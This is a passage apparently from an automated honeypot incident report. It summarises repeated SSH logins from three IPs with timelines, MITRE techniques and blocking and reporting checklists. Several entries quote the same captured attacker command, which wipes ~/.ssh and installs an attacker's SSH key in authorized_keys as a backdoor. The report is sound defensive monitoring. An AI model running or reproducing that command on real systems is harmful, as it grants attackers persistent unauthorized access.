| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:04:55` | `cowrie.session.connect` |
| `2026-06-02 21:04:55` | `cowrie.client.version` |
| `2026-06-02 21:04:55` | `cowrie.client.kex` |
| `2026-06-02 21:04:56` | `cowrie.login.success` |
| `2026-06-02 21:04:56` | `cowrie.session.params` |
| `2026-06-02 21:04:56` | `cowrie.command.input` |
| `2026-06-02 21:04:56` | `cowrie.command.failed` |
| `2026-06-02 21:04:56` | `cowrie.log.closed` |
| `2026-06-02 21:04:56` | `cowrie.session.params` |
| `2026-06-02 21:04:56` | `cowrie.command.input` |
| `2026-06-02 21:04:56` | `cowrie.session.file_download` |
| `2026-06-02 21:04:56` | `cowrie.log.closed` |
| `2026-06-02 21:04:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.208.108[.]166` to AbuseIPDB if not already reported
- [ ] Block `104.208.108[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9d340a2989d

| Field | Detail |
|---|---|
| **Source IP** | `104.208.108[.]166` |
| **First Seen** | 2026-06-02 21:04 |
| **Last Seen** | 2026-06-02 21:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:04:58` | `cowrie.session.connect` |
| `2026-06-02 21:04:58` | `cowrie.client.version` |
| `2026-06-02 21:04:58` | `cowrie.client.kex` |
| `2026-06-02 21:04:58` | `cowrie.login.success` |
| `2026-06-02 21:04:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.208.108[.]166` to AbuseIPDB if not already reported
- [ ] Block `104.208.108[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bcd1efecc15

| Field | Detail |
|---|---|
| **Source IP** | `104.208.108[.]166` |
| **First Seen** | 2026-06-02 21:06 |
| **Last Seen** | 2026-06-02 21:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:06:59` | `cowrie.session.connect` |
| `2026-06-02 21:06:59` | `cowrie.client.version` |
| `2026-06-02 21:06:59` | `cowrie.client.kex` |
| `2026-06-02 21:06:59` | `cowrie.login.success` |
| `2026-06-02 21:07:00` | `cowrie.session.params` |
| `2026-06-02 21:07:00` | `cowrie.command.input` |
| `2026-06-02 21:07:00` | `cowrie.command.failed` |
| `2026-06-02 21:07:00` | `cowrie.log.closed` |
| `2026-06-02 21:07:00` | `cowrie.session.params` |
| `2026-06-02 21:07:00` | `cowrie.command.input` |
| `2026-06-02 21:07:00` | `cowrie.session.file_download` |
| `2026-06-02 21:07:00` | `cowrie.log.closed` |
| `2026-06-02 21:07:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.208.108[.]166` to AbuseIPDB if not already reported
- [ ] Block `104.208.108[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fba859a05038

| Field | Detail |
|---|---|
| **Source IP** | `104.208.108[.]166` |
| **First Seen** | 2026-06-02 21:07 |
| **Last Seen** | 2026-06-02 21:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:07:02` | `cowrie.session.connect` |
| `2026-06-02 21:07:02` | `cowrie.client.version` |
| `2026-06-02 21:07:02` | `cowrie.client.kex` |
| `2026-06-02 21:07:02` | `cowrie.login.success` |
| `2026-06-02 21:07:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.208.108[.]166` to AbuseIPDB if not already reported
- [ ] Block `104.208.108[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0820f41fd09

| Field | Detail |
|---|---|
| **Source IP** | `182.253.156[.]184` |
| **First Seen** | 2026-06-02 21:07 |
| **Last Seen** | 2026-06-02 21:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:07:12` | `cowrie.session.connect` |
| `2026-06-02 21:07:12` | `cowrie.client.version` |
| `2026-06-02 21:07:12` | `cowrie.client.kex` |
| `2026-06-02 21:07:12` | `cowrie.login.success` |
| `2026-06-02 21:07:13` | `cowrie.session.params` |
| `2026-06-02 21:07:13` | `cowrie.command.input` |
| `2026-06-02 21:07:13` | `cowrie.command.failed` |
| `2026-06-02 21:07:13` | `cowrie.log.closed` |
| `2026-06-02 21:07:13` | `cowrie.session.params` |
| `2026-06-02 21:07:13` | `cowrie.command.input` |
| `2026-06-02 21:07:13` | `cowrie.session.file_download` |
| `2026-06-02 21:07:13` | `cowrie.log.closed` |
| `2026-06-02 21:07:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.253.156[.]184` to AbuseIPDB if not already reported
- [ ] Block `182.253.156[.]184` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b603bf187b0d

| Field | Detail |
|---|---|
| **Source IP** | `50.116.72[.]139` |
| **First Seen** | 2026-06-02 21:07 |
| **Last Seen** | 2026-06-02 21:07 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:07:13` | `cowrie.session.connect` |
| `2026-06-02 21:07:13` | `cowrie.client.version` |
| `2026-06-02 21:07:13` | `cowrie.client.kex` |
| `2026-06-02 21:07:14` | `cowrie.login.success` |
| `2026-06-02 21:07:15` | `cowrie.session.params` |
| `2026-06-02 21:07:15` | `cowrie.command.input` |
| `2026-06-02 21:07:15` | `cowrie.command.failed` |
| `2026-06-02 21:07:15` | `cowrie.log.closed` |
| `2026-06-02 21:07:16` | `cowrie.session.params` |
| `2026-06-02 21:07:16` | `cowrie.command.input` |
| `2026-06-02 21:07:16` | `cowrie.session.file_download` |
| `2026-06-02 21:07:16` | `cowrie.log.closed` |
| `2026-06-02 21:07:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.116.72[.]139` to AbuseIPDB if not already reported
- [ ] Block `50.116.72[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c751b228fea

| Field | Detail |
|---|---|
| **Source IP** | `182.253.156[.]184` |
| **First Seen** | 2026-06-02 21:07 |
| **Last Seen** | 2026-06-02 21:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:07:15` | `cowrie.session.connect` |
| `2026-06-02 21:07:15` | `cowrie.client.version` |
| `2026-06-02 21:07:15` | `cowrie.client.kex` |
| `2026-06-02 21:07:15` | `cowrie.login.success` |
| `2026-06-02 21:07:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.253.156[.]184` to AbuseIPDB if not already reported
- [ ] Block `182.253.156[.]184` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a798cf03c22

| Field | Detail |
|---|---|
| **Source IP** | `50.116.72[.]139` |
| **First Seen** | 2026-06-02 21:07 |
| **Last Seen** | 2026-06-02 21:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:07:19` | `cowrie.session.connect` |
| `2026-06-02 21:07:19` | `cowrie.client.version` |
| `2026-06-02 21:07:19` | `cowrie.client.kex` |
| `2026-06-02 21:07:20` | `cowrie.login.success` |
| `2026-06-02 21:07:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.116.72[.]139` to AbuseIPDB if not already reported
- [ ] Block `50.116.72[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce53508ef186

| Field | Detail |
|---|---|
| **Source IP** | `50.116.72[.]139` |
| **First Seen** | 2026-06-02 21:08 |
| **Last Seen** | 2026-06-02 21:08 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:08:44` | `cowrie.session.connect` |
| `2026-06-02 21:08:44` | `cowrie.client.version` |
| `2026-06-02 21:08:44` | `cowrie.client.kex` |
| `2026-06-02 21:08:45` | `cowrie.login.success` |
| `2026-06-02 21:08:46` | `cowrie.session.params` |
| `2026-06-02 21:08:46` | `cowrie.command.input` |
| `2026-06-02 21:08:46` | `cowrie.command.failed` |
| `2026-06-02 21:08:46` | `cowrie.log.closed` |
| `2026-06-02 21:08:46` | `cowrie.session.params` |
| `2026-06-02 21:08:46` | `cowrie.command.input` |
| `2026-06-02 21:08:47` | `cowrie.session.file_download` |
| `2026-06-02 21:08:47` | `cowrie.log.closed` |
| `2026-06-02 21:08:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.116.72[.]139` to AbuseIPDB if not already reported
- [ ] Block `50.116.72[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7fb1717090a7

| Field | Detail |
|---|---|
| **Source IP** | `50.116.72[.]139` |
| **First Seen** | 2026-06-02 21:08 |
| **Last Seen** | 2026-06-02 21:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:08:50` | `cowrie.session.connect` |
| `2026-06-02 21:08:50` | `cowrie.client.version` |
| `2026-06-02 21:08:50` | `cowrie.client.kex` |
| `2026-06-02 21:08:51` | `cowrie.login.success` |
| `2026-06-02 21:08:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.116.72[.]139` to AbuseIPDB if not already reported
- [ ] Block `50.116.72[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1032fc23690e

| Field | Detail |
|---|---|
| **Source IP** | `104.208.108[.]166` |
| **First Seen** | 2026-06-02 21:09 |
| **Last Seen** | 2026-06-02 21:09 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:09:00` | `cowrie.session.connect` |
| `2026-06-02 21:09:00` | `cowrie.client.version` |
| `2026-06-02 21:09:00` | `cowrie.client.kex` |
| `2026-06-02 21:09:01` | `cowrie.login.success` |
| `2026-06-02 21:09:01` | `cowrie.session.params` |
| `2026-06-02 21:09:01` | `cowrie.command.input` |
| `2026-06-02 21:09:01` | `cowrie.command.failed` |
| `2026-06-02 21:09:01` | `cowrie.log.closed` |
| `2026-06-02 21:09:01` | `cowrie.session.params` |
| `2026-06-02 21:09:01` | `cowrie.command.input` |
| `2026-06-02 21:09:01` | `cowrie.session.file_download` |
| `2026-06-02 21:09:01` | `cowrie.log.closed` |
| `2026-06-02 21:09:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.208.108[.]166` to AbuseIPDB if not already reported
- [ ] Block `104.208.108[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c10c9f5140e

| Field | Detail |
|---|---|
| **Source IP** | `104.208.108[.]166` |
| **First Seen** | 2026-06-02 21:09 |
| **Last Seen** | 2026-06-02 21:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:09:03` | `cowrie.session.connect` |
| `2026-06-02 21:09:03` | `cowrie.client.version` |
| `2026-06-02 21:09:03` | `cowrie.client.kex` |
| `2026-06-02 21:09:04` | `cowrie.login.success` |
| `2026-06-02 21:09:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.208.108[.]166` to AbuseIPDB if not already reported
- [ ] Block `104.208.108[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd317f0bd78b

| Field | Detail |
|---|---|
| **Source IP** | `182.253.156[.]184` |
| **First Seen** | 2026-06-02 21:09 |
| **Last Seen** | 2026-06-02 21:09 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:09:10` | `cowrie.session.connect` |
| `2026-06-02 21:09:10` | `cowrie.client.version` |
| `2026-06-02 21:09:10` | `cowrie.client.kex` |
| `2026-06-02 21:09:10` | `cowrie.login.success` |
| `2026-06-02 21:09:10` | `cowrie.session.params` |
| `2026-06-02 21:09:10` | `cowrie.command.input` |
| `2026-06-02 21:09:10` | `cowrie.command.failed` |
| `2026-06-02 21:09:10` | `cowrie.log.closed` |
| `2026-06-02 21:09:11` | `cowrie.session.params` |
| `2026-06-02 21:09:11` | `cowrie.command.input` |
| `2026-06-02 21:09:11` | `cowrie.session.file_download` |
| `2026-06-02 21:09:11` | `cowrie.log.closed` |
| `2026-06-02 21:09:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.253.156[.]184` to AbuseIPDB if not already reported
- [ ] Block `182.253.156[.]184` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-858281bb97b3

| Field | Detail |
|---|---|
| **Source IP** | `182.253.156[.]184` |
| **First Seen** | 2026-06-02 21:09 |
| **Last Seen** | 2026-06-02 21:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:09:12` | `cowrie.session.connect` |
| `2026-06-02 21:09:12` | `cowrie.client.version` |
| `2026-06-02 21:09:12` | `cowrie.client.kex` |
| `2026-06-02 21:09:13` | `cowrie.login.success` |
| `2026-06-02 21:09:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.253.156[.]184` to AbuseIPDB if not already reported
- [ ] Block `182.253.156[.]184` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12cea57abaa0

| Field | Detail |
|---|---|
| **Source IP** | `50.116.72[.]139` |
| **First Seen** | 2026-06-02 21:10 |
| **Last Seen** | 2026-06-02 21:10 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:10:16` | `cowrie.session.connect` |
| `2026-06-02 21:10:16` | `cowrie.client.version` |
| `2026-06-02 21:10:16` | `cowrie.client.kex` |
| `2026-06-02 21:10:17` | `cowrie.login.success` |
| `2026-06-02 21:10:17` | `cowrie.session.params` |
| `2026-06-02 21:10:17` | `cowrie.command.input` |
| `2026-06-02 21:10:17` | `cowrie.command.failed` |
| `2026-06-02 21:10:18` | `cowrie.log.closed` |
| `2026-06-02 21:10:18` | `cowrie.session.params` |
| `2026-06-02 21:10:18` | `cowrie.command.input` |
| `2026-06-02 21:10:18` | `cowrie.session.file_download` |
| `2026-06-02 21:10:18` | `cowrie.log.closed` |
| `2026-06-02 21:10:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.116.72[.]139` to AbuseIPDB if not already reported
- [ ] Block `50.116.72[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b811048c1094

| Field | Detail |
|---|---|
| **Source IP** | `50.116.72[.]139` |
| **First Seen** | 2026-06-02 21:10 |
| **Last Seen** | 2026-06-02 21:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:10:21` | `cowrie.session.connect` |
| `2026-06-02 21:10:21` | `cowrie.client.version` |
| `2026-06-02 21:10:22` | `cowrie.client.kex` |
| `2026-06-02 21:10:23` | `cowrie.login.success` |
| `2026-06-02 21:10:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.116.72[.]139` to AbuseIPDB if not already reported
- [ ] Block `50.116.72[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9eb7d08a3f4

| Field | Detail |
|---|---|
| **Source IP** | `104.208.108[.]166` |
| **First Seen** | 2026-06-02 21:15 |
| **Last Seen** | 2026-06-02 21:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:15:01` | `cowrie.session.connect` |
| `2026-06-02 21:15:01` | `cowrie.client.version` |
| `2026-06-02 21:15:02` | `cowrie.client.kex` |
| `2026-06-02 21:15:02` | `cowrie.login.success` |
| `2026-06-02 21:15:02` | `cowrie.session.params` |
| `2026-06-02 21:15:02` | `cowrie.command.input` |
